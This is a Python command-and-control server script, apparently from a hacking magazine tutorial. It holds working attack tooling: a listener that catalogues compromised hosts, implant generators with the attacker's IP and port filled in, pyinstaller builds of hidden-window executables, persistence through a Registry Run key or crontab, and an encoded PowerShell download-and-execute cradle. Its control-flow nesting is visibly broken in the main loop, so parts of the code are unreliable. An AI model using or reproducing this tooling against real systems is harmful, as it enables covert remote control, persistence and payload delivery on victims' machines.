import socket
import threading
import time
import random
import string
import os
import os.path
import shutil
import base64
import subprocess
from datetime import datetime
from prettytable import PrettyTable

def banner():

    print('                                   .x+=:.                              s ')                                 
    print('                    ..           z`    ^%                            :8      x=~ ')                         
    print('     .d``          @L               .   <k                          .88     88x.   .e.   .e.         u.   ')
    print('     @8Ne.   .u   9888i   .dL     .@8Ned8"      .u         .u      :888ooo "8888X.x888:.x888   ...ue888b  ')
    print('     %8888:u@88N  `Y888k:*888.  .@^%8888"    ud8888.    ud8888.  -*8888888  `8888  888X `888k  888R Y888r ')
    print('      `888I  888.   888E  888I x88:  `)8b. :888`8888. :888`8888.   8888      X888  888X  888X  888R I888> ')
    print('       888I  888I   888E  888I 8888N=*8888 d888 `88%" d888 `88%"   8888      X888  888X  888X  888R I888> ')
    print('       888I  888I   888E  888I  %8"    R88 8888.+"    8888.+"      8888      X888  888X  888X  888R I888> ')
    print('     uW888L  888`   888E  888I   @8Wou 9%  8888L      8888L       .8888Lu=  .X888  888X. 888~ u8888cJ888  ')
    print('    `*88888Nu88P   x888N><888`` .888888P`  `8888c. .+ `8888c. .+  ^%888*     v`%88# "*888Y"   "*888*P"    ')
    print('   ~ ~88888F`      "88"  888  `   ^"F      "88888%    "88888%      `Y"       `~     `"          `Y"       ')
    print('      888 ^              88F                 "YP`       "YP`                                              ')
    print('      *8E               98"                                                                               ')
    print('      `8>             ./"                                                                       by D8RH8R ')
    print('        "             ~`                                                                HVCK Magazine 2023')
    print('                                                                        ')
    print('                                                        Credit to "Learn by doing python3 C2" by The Mayor')
    print('                                                                            https://ko-fi.com/s/0c3776a2a0')


def comm_in(targ_id):
    print(f'[+] Awaiting response...')
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response


def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def target_comm(targ_id, targets, num):
 while True:
    message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
    if len(message) == 0:
        continue
    if message == 'help':
        pass
    else:
        comm_out(targ_id, message)
        if message == 'exit':
            message = base64.b64encode(message.encode())
            targ_id.send(message)
            targ_id.close()
            targets[num][7] = 'Dead'
            break
        if message == 'background':
            break
        if message == 'persist':
            payload_name = input('[+] Enter the name of the payload to add to persistence: ')
        if targets[num][6] == 1:
            persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
            persist_command_1 = base64.b64encode(persist_command_1.encode())
            targ_id.send(persist_command_1)
            persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
            persist_command_2 = base64.b64encode(persist_command_2.encode())
            targ_id.send(persist_command_2)
            print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
        if targets[num][6] == 2: 
            persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -' 
            persist_command = base64.b64encode( persist_command.encode())
            targ_id.send(persist_command)
            print( '[+] Run this command to clean up the crontab: \n crontab -r')
            print('[+] Persistence technique completed.')
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_handler():
     while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            admin = remote_target.recv(1024).decode()
            admin = base64.b64decode(admin).decode()
            op_sys = remote_target.recv(4096).decode()
            op_sys = base64.b64decode(op_sys).decode()
            if admin == 1:
                admin_val = 'Yes'
            elif username == 'root':
                admin_val = 'Yes'
            else:
               admin_val = 'No'
            if 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass


def winplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)

    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occurred with generation. ')
    
def linplant():
        ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
        file_name = f'{ran_name}.py'
        check_cwd = os.getcwd()
        if os.path.exists(f'{check_cwd}\\linplant.py'):
            shutil.copy('linplant.py', file_name)
        else:
            print('[-] linplant.py file not found.')
        with open(file_name) as f:
            new_host = f.read().replace('INPUT_IP_HERE', host_ip)
        with open(file_name, 'w') as f:
            f.write(new_host)
            f.close()
        with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
        with open(file_name, 'w') as f:
            f.write(new_port)
            f.close()
        if os.path.exists(f'{file_name}'):
            print(f'[+] {file_name} saved to {check_cwd}')
        else:
            print('[-] Some error occurred with generation. ')   

def exeplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    exe_file = f'{ran_name}.exe'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
        pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
        print(f'[+] Compiling executable {exe_file}...')
        subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
        os.remove(f'{ran_name}.spec')
        shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}\\{exe_file}'):
        print(f'[+] {exe_file} saved to current directory.')
    else:
        print('[-] Some error occured during generation.')

def pshell_cradle():
    web_server_ip = input('[+] Web server listening host: ')
    web_server_port = input('[+] Web server port: ')
    payload_name = input('[+] Payload name: ')
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    runner_file = f'{runner_file}.txt'
    randomized_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomized_exe_file = f"{randomized_exe_file}.exe"
    print(f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')
    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode ('utf-16le')
    with open(runner_file, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')
    #if the above line cuts off, it continues as ; Start-Process -FilePath {randomized_exe_file}')
        f.close()
        b64_runner_cal = base64.b64encode(runner_cal_unencoded)
        b64_runner_cal = b64_runner_cal.decode()
        print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
        b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
        print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')

def help():
    print('''
    
    ------------------------
    Menu Commands
    ------------------------------------------------------------
    ----------
    listeners -g --> Generate a new listener
    winplant py --> Generate a Windows Compatible Python Payload
    linplant py --> Generate a Linux Compatible Python Payload
    exeplant --> Generate an executable payload for Windows
    sessions -l --> List sessions
    sessions -i <val> --> Enter a new session
    kill <val> --> Kills an active session
    exit --> Exits BarebonesC2
    
    Session Commands
    ------------------------------------------------------------
    -----------
    background --> Backgrounds the current session
    exit --> Terminates the current session 
    ''')

if __name__ == '__main__':
    targets = []
    listener_counter = 0
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input('Enter command#> ')
            if command == 'help':
                help()
            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP to listen on: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == 'pshell_shell':
                pshell_cradle()
            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'linplant py':
                if listener_counter > 0:
                    linplant()  
                
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'exeplant':
                if listener_counter > 0:
                    exeplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username','Admin', 'Target', 'Operating System', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row( [session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                        print(myTable)
                        if command.split(" ")[1] == '-i':
                            try:
                                num = int(command.split(" ")[2])
                                targ_id = (targets[num])[0]
                                if (targets[num])[7] == 'Active':
                                    target_comm(targ_id, targets, num)
                                else:
                                    print('[-] You cannot interact with a dead session.')
                            except (IndexError, ValueError):
                                print(f'[-] Session {num} does not exist.')
                                if command.split(" ")[0] == 'kill': 
                                    try:
                                        num = int(command.split(" ")[1])
                                        targ_id = (targets[num])[0]
                                        if (targets[num])[7] == 'Active':
                                            kill_sig(targ_id, 'exit')
                                            targets[num][7] = 'Dead'
                                            print(f'[+] Session {num} terminated.')
                                        else:
                                            print('[-] You cannot interact with a dead session.')
                                    except (IndexError, ValueError):
                                        print(f'[-] Session {num} does not exist.')
                                        if command == 'exit':
                                            quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
                                        if quit_message == 'y':
                                            tar_length = len(targets)
                                            for target in targets:
                                                if target[7] == 'Dead':
                                                    pass
                                                else:
                                                    comm_out(target[0], 'exit')
                                                kill_flag = 1
                                                if listener_counter > 0:
                                                    sock.close()
                                                break
                                        else:
                                            continue
        except KeyboardInterrupt:
            quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
            if quit_message == 'y':
                tar_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
            kill_flag = 1
            if listener_counter > 0:
                sock.close()
                break
            else:
                continue


